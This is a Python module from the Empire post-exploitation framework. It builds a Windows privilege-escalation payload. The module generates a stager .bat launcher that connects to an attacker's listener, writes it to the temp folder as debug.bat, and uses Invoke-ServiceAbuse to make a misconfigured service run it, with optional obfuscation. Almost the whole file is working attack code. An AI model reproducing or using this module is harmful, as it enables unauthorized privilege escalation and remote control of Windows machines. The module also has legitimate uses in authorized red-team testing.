from __future__ import print_function

import pathlib
from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):        

        # read in the common module source code
        script, err = main_menu.modules.get_module_source(module_name=module.script_path, obfuscate=obfuscate, obfuscate_command=obfuscation_command)
        
        if err:
            return handle_error_message(err)

        # extract all of our options
        service_name = params['ServiceName']

        # generate the .bat launcher code to write out to the specified location
        launcher = main_menu.stagers.stagers['windows/launcher_bat']
        launcher.options['Listener'] = params['Listener']
        launcher.options['UserAgent'] = params['UserAgent']
        launcher.options['Proxy'] = params['Proxy']
        launcher.options['ProxyCreds'] = params['ProxyCreds']
        launcher.options['Delete'] = "True"
        launcher_code = launcher.generate()

        # PowerShell code to write the launcher.bat out
        script_end = ";$tempLoc = \"$env:temp\\debug.bat\""
        script_end += "\n$batCode = @\"\n" + launcher_code + "\"@\n"
        script_end += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"
        script_end += "\"Launcher bat written to $tempLoc `n\";\n"
  
        if launcher_code == "":
            return handle_error_message("[!] Error in launcher .bat generation.")

        script_end += "Invoke-ServiceAbuse -ServiceName \""+service_name+"\" -Command \"C:\\Windows\\System32\\cmd.exe /C `\"$env:Temp\\debug.bat`\"\""

        script = main_menu.modules.finalize_module(script=script, script_end=script_end, obfuscate=obfuscate, obfuscation_command=obfuscation_command)
        return script
